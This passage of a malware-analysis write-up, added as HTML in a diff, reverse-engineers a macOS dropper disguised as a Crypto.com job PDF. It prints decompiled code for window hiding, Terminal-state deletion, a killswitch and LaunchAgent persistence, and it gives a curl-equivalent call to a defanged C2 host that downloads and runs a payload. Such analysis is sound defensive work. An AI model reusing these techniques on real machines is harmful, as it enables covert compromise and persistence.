+<td>331f11417b11350aef9705791ff765d232f816bf</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td>8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0</td>
+</tr>
+</tbody>
+</table>
+<div id="21---preliminary-analysis" class="anchor"></div>
+<h3 class="relative group">2.1 - Preliminary Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#21---preliminary-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>Despite the name, this file is a Mach-O universal binary, which means both arm64 and x86 versions are contained in a single executable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  stage1 file sample-fat-file
+</span></span><span class="line"><span class="cl">sample-fat-file: Mach-O universal binary with <span class="m">2</span> architectures: <span class="o">[</span>x86_64:Mach-O 64-bit executable x86_64<span class="o">]</span> <span class="o">[</span>arm64:Mach-O 64-bit executable arm64<span class="o">]</span>
+</span></span><span class="line"><span class="cl">sample-fat-file <span class="o">(</span><span class="k">for</span> architecture x86_64<span class="o">)</span>:	Mach-O 64-bit executable x86_64
+</span></span><span class="line"><span class="cl">sample-fat-file <span class="o">(</span><span class="k">for</span> architecture arm64<span class="o">)</span>:	Mach-O 64-bit executable arm64
+</span></span></code></pre></div><p>In order to more easily examine this, we can use the tool <code>lipo</code> to extract the build for a particular architecture:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  stage1 lipo sample-fat-file -thin arm64 -output stage1-arm
+</span></span></code></pre></div><p>After binwalking extracted file we can see some other interesting things, particularly that there is a <code>.app</code> archive and another Mach-O included.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  stage1 binwalk stage1-arm
+</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl"><span class="m">1276</span>          0x4FC           Unix path: /usr/lib/dyld
+</span></span><span class="line"><span class="cl"><span class="m">33032</span>         0x8108          gzip compressed data, from Unix, last modified: 2022-09-22 01:02:02
+</span></span><span class="line"><span class="cl"><span class="m">45151</span>         0xB05F          PDF document, version: <span class="s2">&#34;1.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="m">46188</span>         0xB46C          JPEG image data, JFIF standard 1.01
+</span></span><span class="line"><span class="cl"><span class="m">48916</span>         0xBF14          Zlib compressed data, default compression
+</span></span><span class="line"><span class="cl"><span class="m">50863</span>         0xC6AF          JPEG image data, JFIF standard 1.01
+</span></span><span class="line"><span class="cl"><span class="m">72205</span>         0x11A0D         Zlib compressed data, default compression
+</span></span><span class="line"><span class="cl">... ommited extra Zlip entires
+</span></span><span class="line"><span class="cl"><span class="m">706365</span>        0xAC73D         Zlib compressed data, default compression
+</span></span><span class="line"><span class="cl"><span class="m">710555</span>        0xAD79B         gzip compressed data, from Unix, last modified: 2022-09-22 00:47:49
+</span></span><span class="line"><span class="cl"><span class="m">757096</span>        0xB8D68         XML document, version: <span class="s2">&#34;1.0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="m">779039</span>        0xBE31F         XML document, version: <span class="s2">&#34;1.0&#34;</span>
+</span></span></code></pre></div><div id="22---static-analysis" class="anchor"></div>
+<h3 class="relative group">2.2 - Static Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#22---static-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>Now that we have a standalone executable, we can start with static analysis. Opening up the <code>stage1-arm</code> file in Binary Ninja, we can see that the sample is not stripped (slay).</p>
+<p>Function list:</p>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x100002c6c</td>
+<td>int64_t ExecuteFile(int64_t arg1)</td>
+</tr>
+<tr>
+<td>0x100002cd0</td>
+<td>int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3)</td>
+</tr>
+<tr>
+<td>0x100002e08</td>
+<td>int64_t pclose2(int64_t arg1)</td>
+</tr>
+<tr>
+<td>0x100002e10</td>
+<td>int64_t Shell(int64_t arg1, int64_t arg2)</td>
+</tr>
+<tr>
+<td>0x100002f8c</td>
+<td>void strreverse(char* arg1, int64_t arg2)</td>
+</tr>
+<tr>
+<td>0x100002fbc</td>
+<td>void itoa(int64_t arg1, char* arg2, int32_t arg3)</td>
+</tr>
+<tr>
+<td>0x100003054</td>
+<td>int64_t startDaemon()</td>
+</tr>
+<tr>
+<td>0x1000032cc</td>
+<td>int64_t IsSafariFAExist()</td>
+</tr>
+<tr>
+<td>0x100003358</td>
+<td>int64_t thExec()</td>
+</tr>
+<tr>
+<td>0x100003790</td>
+<td>char* GetUserName()</td>
+</tr>
+<tr>
+<td>0x100003838</td>
+<td>int64_t _main()</td>
+</tr>
+</tbody>
+</table>
+<div id="221---main" class="anchor"></div>
+<h4 class="relative group">2.2.1 - Main 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#221---main" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>The actual main function is pretty long, not because it is complex but because there is a ton of string construction going on. This is because the executable makes frequent use of bash/zsh commands through a helper method called <code>Shell()</code>. Main starts off by attempting to hide these commands by running a few <code>printf</code> statements to modify the shell window:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">_printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[3J&#34;</span><span class="p">);</span> <span class="c1">// clears the entire screen and deletes all lines saved in the scrollback buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">_printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[8;1;1t&#34;</span><span class="p">);</span> <span class="c1">// resize the terminal window to 1x1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">_printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[2t&#34;</span><span class="p">);</span> <span class="c1">// minimize the window
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">Shell</span><span class="p">(</span><span class="s">&#34;printf &#39;</span><span class="se">\x1b</span><span class="s">[8;1;1t&#39; &amp;&amp; printf </span><span class="se">\&#39;\x1b</span><span class="s">[2t</span><span class="se">\&#39;</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// use shell helper to again resize the window and minimize
+</span></span></span></code></pre></div><p>Next, a few strings are built using a series of <code>strcats</code> and <code>strcpys</code>.</p>
+<ol>
+<li>a filepath:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/Users/<span class="o">{</span>username<span class="o">}</span>/Library/DiagnosticsPeer/CryptoComJobOpportunities.pdf
+</span></span></code></pre></div><ol start="2">
+<li>a bash command:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">open <span class="se">\&#39;</span><span class="o">{</span>filepath<span class="o">}</span><span class="se">\&#39;</span> <span class="o">&amp;&amp;</span> rm -rf <span class="se">\&#39;</span>/Users/<span class="o">{</span>username<span class="o">}</span>/Library/Saved Application State/com.apple.Terminal.savedState<span class="se">\&#39;</span>
+</span></span></code></pre></div><p>The embedded PDF file is written to the location above and the bash command is executed. The bash command opens the PDF and deletes the terminal history. This gives the impression that the double-clicked file is actually a PDF and not an executable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">FILE</span> <span class="o">*</span><span class="n">filepath_fp</span> <span class="o">=</span> <span class="nf">_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">filepath</span><span class="p">,</span> <span class="mh">0x201</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">filepath_fp</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_write</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_close</span><span class="p">(</span><span class="n">filepath_fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">Shell</span><span class="p">(</span><span class="o">&amp;</span><span class="n">command</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span></code></pre></div><p>Finally, <code>thExec()</code> and then a check against the killswitch are called. If the next stage is already found to be running, execution will stop.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">//cont...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">thExec</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IsSafariFAExist</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_g_d</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">Shell</span><span class="p">(</span><span class="s">&#34;killall Terminal&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="222---killswitch" class="anchor"></div>
+<h4 class="relative group">2.2.2 - Killswitch 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#222---killswitch" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>The function <code>IsSafariFAExist()</code> is a killswitch to prevent installation if the next stage is already running on the host. It uses the <code>Shell()</code> helper function to execute <code>pgrep</code> which searches for the running process <em>diageventagent</em>. This function is checked a few times in: main, thExec, and startDaemon. The behavior of exiting if the function returns true is consistent.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">int_conv_of_pgrep_output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">return_val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="n">outcome_of_pgrep</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">memset</span><span class="p">(</span><span class="n">outcome_of_pgrep</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Shell</span><span class="p">(</span><span class="s">&#34;pgrep -f diageventagent&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outcome_of_pgrep</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">outcome_of_pgrep</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">int_conv_of_pgrep_output</span> <span class="o">=</span> <span class="nf">_atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">outcome_of_pgrep</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">int_conv_of_pgrep_output</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">return_val</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(((</span><span class="n">outcome_of_pgrep</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">outcome_of_pgrep</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">int_conv_of_pgrep_output</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">return_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">return_val</span><span class="p">;</span>
+</span></span></code></pre></div><div id="223---thexec" class="anchor"></div>
+<h4 class="relative group">2.2.3 - <code>thExec()</code> 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#223---thexec" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>This function is responsible for writing the included <code>.app</code> archive and subsequent executables to dist as well as triggering the persistence mechanism. Just like main it makes heavy use of <code>Shell()</code> and most of it&rsquo;s length comes from the tedious tedious string building.</p>
+<p>There are 5 main strings built:</p>
+<ol>
+<li>A source path: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent_</code></li>
+<li>A destination path: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent</code></li>
+<li>A temp path: <code>/Users/{username}/Library/DiagnosticsPeer/diagevent_</code></li>
+<li>Command 1:<code>tar zxvf \'{temp}\' -C \'{dest}\'</code></li>
+<li>Command 2: <code>open -a \'{dest}/diageventd.app\'</code></li>
+</ol>
+<p>The core logic of this function is quite short and centers around checking against the killswitch before triggering the persistence mechanism.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">IsSafariFAExist</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">Shell</span><span class="p">(</span><span class="s">&#34;killall Terminal&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IsSafariFAExist</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int32_t</span> <span class="n">x0_45</span><span class="p">;</span> <span class="c1">// killswitch status
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">Shell</span><span class="p">(</span><span class="o">&amp;</span><span class="n">command2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">startDaemon</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">_sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_g_c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// global state variable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">x0_45</span> <span class="o">=</span> <span class="nf">IsSafariFAExist</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">x0_45</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">_access</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_g_e</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// global state variable
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div id="224---persistence" class="anchor"></div>
+<h4 class="relative group">2.2.4 - Persistence 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#224---persistence" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>The <code>startDaemon()</code> function is how this malware establishes persistence. It does so through a LaunchAgent daemon called &ldquo;iTunes_trush&rdquo; (banger playlist name).</p>
+<p>The general flow of this function is:</p>
+<ol>
+<li>Create directory in <code>/Users/{username}/Library/LaunchAgents/</code></li>
+<li>Create plist file in <code>/Users/{username}/Library/LaunchAgents/com.diagnosticspeer.plist</code></li>
+<li>Create filepath string for second stage executable: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent</code></li>
+<li>Write second stage executable.</li>
+</ol>
+<p>The following is the contents of the written plist file. It is setup so that launchd will runs the executable <code>diageventagent</code> at system boot.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">plist</span> <span class="na">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">dict</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">key</span><span class="p">&gt;</span>Label<span class="p">&lt;/</span><span class="nt">key</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;</span>iTunes_trush<span class="p">&lt;/</span><span class="nt">string</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">key</span><span class="p">&gt;</span>OnDemand<span class="p">&lt;/</span><span class="nt">key</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">true</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">key</span><span class="p">&gt;</span>ProgramArguments<span class="p">&lt;/</span><span class="nt">key</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">array</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">string</span><span class="p">&gt;</span>/Users/{username}/Library/DiagnosticsPeer/diageventagent<span class="p">&lt;/</span><span class="nt">string</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;/</span><span class="nt">array</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">key</span><span class="p">&gt;</span>RunAtLoad<span class="p">&lt;/</span><span class="nt">key</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">true</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">key</span><span class="p">&gt;</span>KeepAlive<span class="p">&lt;/</span><span class="nt">key</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">true</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">dict</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">plist</span><span class="p">&gt;</span>
+</span></span></code></pre></div><div id="3-third-stage" class="anchor"></div>
+<h2 class="relative group">3. Third Stage 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#3-third-stage" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<table>
+<thead>
+<tr>
+<th>Trait</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>diageventagent</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>edc8136611b90ea492830adde099b1a6</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>1104a10689f4887ea9bba47fe3e115e271414fbe</td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7</td>
+</tr>
+</tbody>
+</table>
+<div id="31---preliminary-analysis" class="anchor"></div>
+<h3 class="relative group">3.1 - Preliminary Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#31---preliminary-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>Again, this file is a Mach-O universal binary so we repeat the process of extracting a particular build for the purposes of analysis. I chose the ARM version for consistency.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  stage2 file fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7
+</span></span><span class="line"><span class="cl">fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7: Mach-O universal binary with <span class="m">2</span> architectures: <span class="o">[</span>x86_64:Mach-O 64-bit executable x86_64<span class="o">]</span> <span class="o">[</span>arm64:Mach-O 64-bit executable arm64<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 <span class="o">(</span><span class="k">for</span> architecture x86_64<span class="o">)</span>:	Mach-O 64-bit executable x86_64
+</span></span><span class="line"><span class="cl">fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 <span class="o">(</span><span class="k">for</span> architecture arm64<span class="o">)</span>:	Mach-O 64-bit executable arm64
+</span></span><span class="line"><span class="cl">➜  stage2 lipo fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 -thin arm64 -output stage2-arm-sample
+</span></span></code></pre></div><div id="32---static-analysis" class="anchor"></div>
+<h3 class="relative group">3.2 - Static Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#32---static-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>After opening up this file in Binja we can see that it is also not stripped and shares a number of similarities with the previous stage.</p>
+<p><strong>Function list</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x100002c3c</td>
+<td>int64_t ExecuteFile(int64_t arg1)</td>
+</tr>
+<tr>
+<td>0x100002c90</td>
+<td>int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3)</td>
+</tr>
+<tr>
+<td>0x100002dc8</td>
+<td>int64_t pclose2(int64_t arg1)</td>
+</tr>
+<tr>
+<td>0x100002dd0</td>
+<td>int64_t Shell()</td>
+</tr>
+<tr>
+<td>0x100002f58</td>
+<td>int64_t write_data()</td>
+</tr>
+<tr>
+<td>0x100002f5c</td>
+<td>int64_t DownloadFile()</td>
+</tr>
+<tr>
+<td>0x10000367c</td>
+<td>void strreverse(char* arg1, int64_t arg2)</td>
+</tr>
+<tr>
+<td>0x1000036ac</td>
+<td>void itoa(int64_t arg1, char* arg2, int32_t arg3)</td>
+</tr>
+<tr>
+<td>0x100003744</td>
+<td>int64_t cp()</td>
+</tr>
+<tr>
+<td>0x1000038d0</td>
+<td>int64_t _main()</td>
+</tr>
+</tbody>
+</table>
+<div id="321---main" class="anchor"></div>
+<h4 class="relative group">3.2.1 - Main 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#321---main" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p><strong>Shocker</strong> this main also is mostly just string building. This stage also preodically checks in with the C2 server to try and download a payload located at <code>https[:]//capitalzeroco.com/{user's UID}.png</code>. If the file is found, it would be written to <code>/Users/{username}/&quot;/Library/DiagnosticsPeer/AppStore</code>.</p>
+<p>It then drops into the following infinite loop:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x0_10</span> <span class="o">=</span> <span class="nf">DownloadFile</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">x0_10</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_sleep</span><span class="p">(</span><span class="mh">0x4b0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">x0_10</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ExecuteFile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">filepath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">_sleep</span><span class="p">(</span><span class="mh">0x4b0</span><span class="p">)</span>
+</span></span></code></pre></div><div id="322---download-file" class="anchor"></div>
+<h4 class="relative group">3.2.2 - Download File 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#322---download-file" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>Then <code>libcurl</code> to build a curl command that would be equivalent to:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X GET <span class="s2">&#34;https[:]//capitalzeroco[.]com?response=&lt;response_data&gt;&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -H <span class="s2">&#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -H <span class="s2">&#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8&#34;</span>
+</span></span></code></pre></div><p>If there is a successful download, it would try to perform the following command using the <code>Shell()</code> helper:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar zxvf <span class="se">\&#39;</span><span class="o">{}</span><span class="se">\&#39;</span> -C <span class="se">\&#39;</span><span class="o">{</span>new file<span class="o">}</span><span class="se">\&#39;</span><span class="s2">&#34;
+</span></span></span></code></pre></div><div id="4-infrastructure-analysis" class="anchor"></div>
+<h2 class="relative group">4. Infrastructure Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#4-infrastructure-analysis" aria-label="Anchor">#</a></span>        
+    
+</h2>
